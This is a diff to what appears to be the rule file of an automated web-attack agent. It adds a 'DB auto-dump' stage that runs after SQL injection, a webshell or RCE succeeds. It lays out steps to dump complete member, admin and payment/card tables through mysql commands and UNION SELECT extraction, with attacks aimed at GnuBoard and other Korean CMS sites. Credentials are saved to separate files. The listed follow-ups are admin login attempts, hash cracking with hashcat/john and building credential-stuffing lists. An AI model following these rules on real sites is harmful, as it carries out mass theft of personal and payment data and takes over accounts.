@@ -508,6 +508,73 @@ WAF NEW SIGNATURES (auto-detected, auto-bypassed):
   3. test_coupon_abuse(endpoint, coupon_param) → ADMIN/TEST/FREE/NULL codes
   4. test_quantity_manipulation() → 0, -1, 99999, NaN, Infinity
 
+=== v2.7.0 DB AUTO-DUMP ENGINE DECISION RULES ===
+
+[DB FULL DUMP — bingo.tools.db_dumper]
+  MANDATORY TRIGGER: SQLi confirmed / WebShell uploaded / RCE achieved → IMMEDIATELY run DbDumper
+
+  STEP 1 — Initialize:
+    dumper = DbDumper(query_fn=sql_exec, db_type=detected_type, target=base_url)
+    - query_fn: function that executes SQL and returns list[dict] or str
+    - For SQLi: lambda sql: sqli_engine.extract_via_sqli(url, param, sql)
+    - For WebShell: lambda sql: webshell_exec(f"mysql -u{user} -p{pw} -e '{sql}'")
+    - For RCE: lambda sql: rce_exec(f"mysql -u{user} -p{pw} -e \"{sql}\"")
+
+  STEP 2 — Auto dump execution (ALWAYS run ALL three):
+    report = dumper.auto_dump(
+        dump_member=True,    # 회원 DB 전체 덤프 (MANDATORY)
+        dump_admin=True,     # 관리자 DB 전체 덤프 (MANDATORY)
+        dump_sensitive=True, # 결제/세션/설정 테이블 덤프
+        dump_all=False,      # True: 모든 테이블 덤프 (RCE/WebShell 확인 시)
+        max_rows_per_table=50000,
+    )
+
+  STEP 3 — Output:
+    - report.member_dumps → 회원 테이블 덤프 목록
+    - report.admin_dumps  → 관리자 테이블 덤프 목록
+    - report.total_records → 총 추출 행 수
+    - report.save_dir     → 저장 경로
+    - CREDENTIALS_{table}.json → 아이디/비밀번호/해시 분리 자동 저장
+
+  TABLE CLASSIFICATION (auto):
+    "admin" (priority 100): admin, administrator, manager, staff, operator, g5_admin, xe_admin
+    "member" (priority 90): member, user, customer, account, g5_member, xe_member, mb_
+    "sensitive" (priority 50): payment, card, order, transaction, log, session, token, config
+    "other" (priority 0): everything else
+
+  DB TYPE AUTO-DETECTION → pass to db_type:
+    MySQL/MariaDB → "mysql"  (GnuBoard/XE/WordPress = 99% MySQL)
+    MSSQL         → "mssql"  (ASP.NET targets)
+    PostgreSQL    → "postgresql"
+    SQLite        → "sqlite"
+    Oracle        → "oracle"
+
+  SQLI UNION DUMP (no query_fn available):
+    dumper.dump_via_sqli_union(url, param, cols_count, target_col, request_fn, table, col)
+    → Extracts full column data via UNION SELECT GROUP_CONCAT with pagination
+
+  WEBSHELL DUMP (RCE confirmed):
+    cmd = DbDumper.gen_webshell_dump_cmd(db_type, db_user, db_pass, db_name, table)
+    → Generate platform-specific dump command (mysqldump/sqlcmd/psql/sqlite3)
+    → Run via WebShell → save output
+
+  CREDENTIAL EXTRACTION (auto per dump):
+    - Columns matching: id/email/user/login/mb_id → identity
+    - Columns matching: pw/pass/password/hash/mb_password → credentials
+    - Saved as CREDENTIALS_{table}.json separately
+
+  PRIORITY ORDER:
+    1. admin tables (관리자 ID/PW → 즉시 로그인 시도)
+    2. member tables (회원 전체 명단)
+    3. sensitive tables (결제정보/카드번호)
+    4. other tables (if dump_all=True)
+
+  POST-DUMP ACTIONS:
+    1. Open CREDENTIALS_*.json → try admin credentials on /admin, /manage, /adm
+    2. Report admin password hash → suggest hashcat/john cracking
+    3. Feed member email list → potential credential stuffing target list
+    4. ReportBuilder.add_vuln(title="DB Full Dump", severity="CRITICAL", ...)
+
 === AUTO ORCHESTRATION (v2.6.0 FULL PIPELINE) ===
 PHASE 0 (Recon):        ReconEngine → SubdomainTakeoverScanner
 PHASE 1 (Quick Win):    NucleiRunner (builtin 15 templates)
@@ -518,6 +585,7 @@ PHASE 5 (Logic):        BizlogicFuzzer → RaceConditionEngine → UploadBypassE
 PHASE 6 (Protocol):     SmugglingScanner → CachePoisonTester → IdorScanner
 PHASE 7 (Client):       DomXssScanner → SsrfScanner
 PHASE 8 (Post-Exploit): PostExploitEngine → ReportBuilder
+PHASE 9 (DB Full Dump): DbDumper → member + admin + sensitive → CREDENTIALS 추출 → 관리자 로그인 시도
 
 === GNUBOARD5 / KOREAN CMS SPECIFIC RULES ===
 When fingerprint shows gnuboard5 / g5_ variables in page:
